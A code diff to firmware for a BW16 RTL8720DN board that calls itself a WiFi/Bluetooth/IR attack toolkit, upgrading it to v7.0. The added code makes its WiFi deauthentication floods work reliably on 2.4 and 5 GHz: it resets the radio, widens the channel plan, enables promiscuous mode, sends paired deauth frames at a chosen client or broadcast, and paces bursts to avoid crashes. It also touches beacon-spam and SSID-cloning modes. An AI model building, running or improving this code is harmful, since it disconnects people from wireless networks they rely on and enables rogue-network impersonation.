@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────
-//  RAONE  –  BW16 RTL8720DN  Firmware v5.0
+//  RAONE  –  BW16 RTL8720DN  Firmware v7.0
 //  WiFi / Bluetooth / IR attack & analysis toolkit
 //  2-button UI: BTN_OK (TTP223 touch) + BTN_NAV (tactile push)
 //  Long-hold OK (>800 ms) = EMERGENCY BACK (universal, any state)
@@ -174,13 +174,61 @@ void exitWifiAnalyzer();
 void exitSniffer();
 void startSniffer(uint8_t band);
 
+void telemetryWatchdogTask(const void *arg) {
+  (void)arg;
+  static uint32_t lastReportSeq = 0;
+  static bool reportedFreeze = false;
+
+  while (1) {
+    delay(1000);
+    // Toggle Yellow LED as independent hardware heartbeat for FreeRTOS scheduler liveness
+    digitalWrite(LED_YELLOW, !digitalRead(LED_YELLOW));
+
+    TxProbeSummary summary = txProbeGetSummary();
+    
+    // Emit 1-second Serial heartbeat from safe background thread
+    Serial.print(F("[HEARTBEAT] Up: "));
+    Serial.print(millis() / 1000);
+    Serial.print(F("s | Heap: "));
+    Serial.print((uint32_t)xPortGetFreeHeapSize());
+    Serial.print(F("B | TxCount: "));
+    Serial.print(summary.total_entered);
+    Serial.print(F(" | Stage: "));
+    Serial.println(summary.current_stage);
+
+    if (summary.total_entered > 0) {
+      uint32_t elapsed = millis() - summary.last_activity_ms;
+      if (elapsed >= 1500 && !reportedFreeze && summary.current_stage != TX_STAGE_IDLE) {
+        reportedFreeze = true;
+        Serial.println(F("\n[PROBE WATCHDOG] *** TX FREEZE DETECTED (>1500ms inactivity) ***"));
+        txProbePrintReport();
+      } else if (summary.total_entered != lastReportSeq) {
+        lastReportSeq = summary.total_entered;
+        reportedFreeze = false;
+      }
+    }
+  }
+}
+
 void setup() {
   Serial.begin(115200);
-  delay(50);
+  delay(150);
+
+  Serial.println(F("\n\n=========================================="));
+  Serial.println(F("NICE MCU RTL8720DN DIAGNOSTIC BOOT"));
+  Serial.println(F("=========================================="));
+  Serial.println(F("Serial OK (115200 Baud, LOG_UART PA7/PA8)"));
+  Serial.println(F("Telemetry Initialized"));
+  Serial.println(F("Starting TX diagnostics..."));
+  Serial.println(F("==========================================\n"));
+
+  // Start telemetry watchdog immediately with AboveNormal priority (preempts main task on freeze)
+  os_thread_create_arduino(telemetryWatchdogTask, NULL, OS_PRIORITY_ABOVENORMAL, 2048);
 
   hwBegin();
   irBegin();
   uiBegin();
+  uiDrawInitialLogo();
 
   wifiScannerBegin();
   sniffBegin();
@@ -624,6 +672,7 @@ void handleOk() {
   }
 
   if (uiState == UI_BAND_MENU) {
+    uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
     if (beaconSpamStart(selectedBand)) {
       uiState = UI_BEACON_SPAM;
       uiDrawBeaconSpam();
@@ -665,6 +714,7 @@ void handleOk() {
     }
     else if (actionMenuIndex == 2) {
       // Clone & Beacon
+      uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
       beaconSpamSetCloneSSID(wifiScannerNetwork(actionNetworkIdx).ssid);
       uint8_t band = wifiScannerIs5GHz(wifiScannerNetwork(actionNetworkIdx).channel) ? 5 : 2;
       if (beaconSpamStart(band)) {
@@ -952,55 +1002,95 @@ bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
     return false;
   }
 
+  // Draw activating screen
+  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
+  ledFlashGreen(1, 100);
+
+  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+  wifi_set_channel(target.channel);
+  delay(80);
+
+  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
+  // Without this, the MAC refuses to transmit raw frames on 5GHz, filling the queue until the CPU crashes.
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
   // Draw full deauth attack screen with live counter
   uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);
 
-  wifi_on(RTW_MODE_STA);
-  wifi_change_channel_plan(0x25);
-  wifi_set_channel(target.channel);
-
   bool anySent = false;
   uint32_t sentCount = 0;
-  uint32_t lastUiUpdate = 0;
+  uint32_t lastUiUpdate = millis();
   uint32_t lastBuzzer = 0;
 
   uint8_t dstMacBuf[6];
   memcpy(dstMacBuf, dstMac, 6);
+
+  txProbeReset();
 
   while (true) {
     if (anyButtonPressed()) {
       return stopPacketInjectionLab(anySent, sentCount);
     }
 
+    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
     for (uint8_t burst = 0; burst < 10; burst++) {
       if (anyButtonPressed()) {
         return stopPacketInjectionLab(anySent, sentCount);
       }
 
-      bool sent = wifi_tx_deauth_frame(targetMac, dstMacBuf, LAB_DEAUTH_REASON);
-      if (sent) {
+      bool sent1 = wifi_tx_deauth_frame(targetMac, dstMacBuf, targetMac, LAB_DEAUTH_REASON);
+      if (sent1) {
         anySent = true;
         sentCount++;
-        ledFlashGreen(1, 5);
+        ledGreenOn();
       } else {
-        ledFlashRed(1, 5);
+        delay(20);
       }
+      delay(15);
 
-      delay(5);
-      yield();
+      bool sent2 = wifi_tx_deauth_frame(dstMacBuf, targetMac, targetMac, LAB_DEAUTH_REASON);
+      if (sent2) {
+        anySent = true;
+        sentCount++;
+        ledGreenOff();
+      } else {
+        delay(20);
+      }
+      delay(15);
     }
+    ledGreenOff();
 
-    if (millis() - lastUiUpdate > 60) {
+    // CRITICAL FIX: Explicit DMA flush yield.
+    // Give the hardware MAC 100ms to completely empty the xmit_frame queue over the air
+    // before we queue the next burst, preventing the 96-frame HardFault.
+    delay(100);
+
+    if (millis() - lastUiUpdate > 80) {
       lastUiUpdate = millis();
       uiRefreshDeauthCounter(sentCount);
+
+      static uint32_t lastReportedCount = 0;
+      if (sentCount >= lastReportedCount + 10) {
+        lastReportedCount = sentCount;
+        Serial.print(F("[TX STREAM] Sent: ")); Serial.print(sentCount);
+        Serial.print(F(" | Heap: ")); Serial.print((uint32_t)xPortGetFreeHeapSize());
+        Serial.print(F("B | Stage: ")); Serial.print(txProbeGetSummary().current_stage);
+        Serial.print(F(" | Time: ")); Serial.println(millis());
+      }
     }
 
-    if (sentCount - lastBuzzer >= 40) {
+    if (sentCount - lastBuzzer >= 30) {
       lastBuzzer = sentCount;
       buzzerClick();
     }
 
-    delay(10);
+    delay(20);
     yield();
   }
 }
@@ -1025,61 +1115,104 @@ bool runPacketInjectionLab() {
     return false;
   }
 
+  // Draw activating screen
+  uiDrawGenericMessage("ATTACK INIT", "Activating Mode...", "Please wait");
+  ledFlashGreen(1, 100);
+
+  // Full radio reset to ensure PLL locks onto target channel (especially 5GHz ch 161)
+  wifi_off();
+  delay(150);
+  wifi_on(RTW_MODE_STA);
+  delay(150);
+  wifi_change_channel_plan(0x7F);
+  delay(100);
+  wifi_set_channel(target.channel);
+  delay(80);
+
+  // CRITICAL FIX: Enable Promiscuous Mode to bypass MAC state machine filtering
+  // Without this, the MAC refuses to transmit raw frames on 5GHz, filling the queue until the CPU crashes.
+  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+
   // Draw full deauth attack screen with live counter
   uiDrawDeauthScreen(target.ssid, target.channel, target.channel >= 36, 0);
 
-  wifi_on(RTW_MODE_STA);
-  wifi_change_channel_plan(0x25);
-  wifi_set_channel(target.channel);
-
   bool anySent = false;
   uint32_t sentCount = 0;
-  uint32_t lastUiUpdate = 0;
+  uint32_t lastUiUpdate = millis();
   uint32_t lastBuzzer = 0;
+
+  txProbeReset();
 
   while (true) {
     if (anyButtonPressed()) {
       return stopPacketInjectionLab(anySent, sentCount);
     }
 
-    for (uint8_t burst = 0; burst < 10; burst++) {
+    // Burst loop: 20 packets (keeps it well below the 95-frame crash limit)
+    for (uint8_t burst = 0; burst < 20; burst++) {
       if (anyButtonPressed()) {
         return stopPacketInjectionLab(anySent, sentCount);
       }
 
-      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
+      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, targetMac, LAB_DEAUTH_REASON);
       if (sent) {
         anySent = true;
         sentCount++;
-        ledFlashGreen(1, 5);
+        ledGreenOn();
       } else {
-        ledFlashRed(1, 5);
+        delay(20);
       }
 
-      delay(5);
-      yield();
+      delay(15);
     }
+    ledGreenOff();
 
-    if (millis() - lastUiUpdate > 60) {
+    // CRITICAL FIX: Explicit DMA flush yield.
+    // Give the hardware MAC 100ms to completely empty the xmit_frame queue over the air
+    // before we queue the next burst, preventing the 96-frame HardFault.
+    delay(100);
+
+    if (millis() - lastUiUpdate > 80) {
       lastUiUpdate = millis();
       uiRefreshDeauthCounter(sentCount);
+
+      static uint32_t lastReportedCount = 0;
+      if (sentCount >= lastReportedCount + 10) {
+        lastReportedCount = sentCount;
+        Serial.print(F("[TX STREAM] Sent: ")); Serial.print(sentCount);
+        Serial.print(F(" | Heap: ")); Serial.print((uint32_t)xPortGetFreeHeapSize());
+        Serial.print(F("B | Stage: ")); Serial.print(txProbeGetSummary().current_stage);
+        Serial.print(F(" | Time: ")); Serial.println(millis());
+      }
     }
 
-    if (sentCount - lastBuzzer >= 40) {
+    if (sentCount - lastBuzzer >= 30) {
       lastBuzzer = sentCount;
       buzzerClick();
     }
 
-    delay(10);
+    delay(20);
     yield();
   }
 }
 
 bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
   labInjectionStoppedByUser = true;
+  ledAllOff();
   uiDrawStatus("Stopped");
   buzzerClick();
-  delay(300);
+
+  // Print in-memory telemetry probe log upon stop
+  txProbePrintReport();
+  
+  // Clean radio restore
+  wifi_set_promisc(0, NULL, 0);
+  wifi_off();
+  delay(100);
+  wifi_on(RTW_MODE_STA);
+  wifi_change_channel_plan(0x7F);
+  delay(150);
+
   waitForLabButtonsReleased();
   return anySent;
 }
